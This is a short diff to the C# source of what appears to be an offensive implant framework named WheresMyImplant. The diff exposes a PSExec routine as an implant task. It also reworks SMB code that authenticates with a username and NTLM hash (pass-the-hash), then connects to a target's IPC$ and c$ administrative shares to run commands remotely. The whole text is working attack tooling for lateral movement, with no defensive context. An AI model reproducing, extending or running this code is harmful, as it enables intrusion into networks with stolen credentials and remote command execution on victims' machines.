@@ -563,6 +563,7 @@ namespace WheresMyImplant
             }
         }
 
+        [ManagementTask]
         public static void PSExec(String system, String execute, String isCommand)
         {
             Boolean comspec;
@@ -619,10 +620,13 @@ namespace WheresMyImplant
                 smbClient.NegotiateSMB();
                 smbClient.NegotiateSMB2();
                 smbClient.NTLMSSPNegotiate();
-                smbClient.Authenticate(domain, username, hash);
-                smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
-                smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, "c$"));
-                smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "c$"));
+                if (smbClient.Authenticate(domain, username, hash))
+                {
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, "c$"));
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "c$"));
+                    smbClient.CreateRequest();
+                }
                 output = smbClient.GetOutput();
             }
             return output;
